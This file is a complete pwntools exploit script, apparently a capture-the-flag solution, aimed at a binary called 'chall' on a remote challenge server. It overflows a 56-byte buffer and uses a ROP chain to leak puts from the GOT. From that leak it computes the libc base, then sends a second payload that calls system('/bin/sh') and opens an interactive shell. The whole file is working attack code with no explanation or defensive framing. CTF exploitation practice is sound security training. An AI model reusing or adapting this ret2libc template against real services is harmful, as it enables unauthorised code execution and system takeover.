from pwn import *

elf = ELF("chall")
libc = ELF("libc-2.31.so")
p = elf.process()
p = remote("34.143.158.202", 4097)
pop_rdi = 0x000000000040137b
ret = pop_rdi + 1
payload = b"A"*56
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym.main)

p.sendline(payload)
p.sendline(b"A")
p.recvuntil("NOPE\n")
leaked_puts = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00"))

print(hex(leaked_puts))
libc.address = leaked_puts - libc.sym.puts
log.info("Libc base: "+ hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload2 = b"A"*56
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(ret)
payload2 += p64(libc.sym['system'])
p.sendline(payload2)
p.sendline(b"A")
p.interactive()